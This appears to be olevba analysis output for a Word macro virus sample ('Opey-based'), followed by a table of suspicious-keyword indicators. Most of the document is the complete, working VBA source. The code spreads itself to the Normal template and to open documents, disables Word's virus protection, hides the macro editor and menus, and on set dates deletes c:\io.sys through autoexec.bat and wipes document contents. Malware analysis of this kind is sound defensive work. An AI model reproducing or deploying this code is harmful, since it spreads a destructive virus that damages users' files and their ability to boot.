olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey-based-f25daccd2be75f05b8746930d6d9dd055bb40daa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey-based-f25daccd2be75f05b8746930d6d9dd055bb40daa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO nwrd_01.bas 
in file: Virus.MSWord.Opey-based-f25daccd2be75f05b8746930d6d9dd055bb40daa - OLE stream: 'Macros/VBA/nwrd_01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HELLO2U()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        Line1$ = ""
        line2$ = ""
        line3$ = ""
        line4$ = ""
        If ((Day(Date) >= 15) And (Day(Date) <= 31)) Then
            Line1$ = "echo I LOVE YOU MARHEA C."
            line4$ = "echo FROM: nwrd"
        End If
        If (Day(Date) = 1) Then
            line2$ = "attrib -s -h -r c:\io.sys"
            line3$ = "del c:\io.sys"
        End If
        
        If Line1$ <> "" Or (Day(Date) = 1) Then
            Open autoexecfile$ For Append Access Write As hFile
                Print #hFile, "@echo off"
                Print #hFile, line2$
                Print #hFile, line3$
                Print #hFile, Line1$
                Print #hFile, line4$
                Print #hFile, "echo."
                Print #hFile, "pause"
            Close hFile
        End If
End Sub
Sub URD1()
  On Error Resume Next
    Call nwrd_01
    NTInfected = False
        For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(i).Name
                If clan = "nwrd_01" Then NTInfected = True
                If (clan <> "nwrd_01") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next i
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "nwrd_01" Then ODInfected = True
                    If (clan <> "nwrd_01") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="nwrd_01", Object:=wdOrganizerObjectProjectItems
                    opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="nwrd_01", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call HELLO2U
End Sub
Sub nwrd_01()
    On Error Resume Next
    Application.UserName = "nwrd"
    Application.UserAddress = "AMACC - SCL"
    Application.UserInitials = "LM555"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "nwrd"
        .Title = "LM555"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub WARNING()
    If ((Day(Date) = 15) Or (Day(Date) = 31)) Then
        On Error Resume Next
        Selection.WholeStory
        Selection.Delete unit:=wdCharacter, Count:=1
        ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, Address:="I LOVE YOU MARHEA C. - FROM: nwrd"
        If ActiveDocument.Saved = False Then ActiveDocument.Save
        If NormalTemplate.Saved = False Then NormalTemplate.Save
        MsgBox "143 MARHEA C.", vbExclamation, "FROM: nwrd"
        Application.Quit
    End If
End Sub
Sub FileSave()
    On Error Resume Next
    Call WARNING
    Call URD1
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call WARNING
    Call URD1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call WARNING
    Call URD1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call URD1
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call URD1
End Sub
Sub AutoExec()
    On Error Resume Next
    Call URD1
End Sub
Sub Filesaveas()
    On Error Resume Next
    Call WARNING
    Call URD1
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call URD1
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call URD1
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub Fileopen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call URD1
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

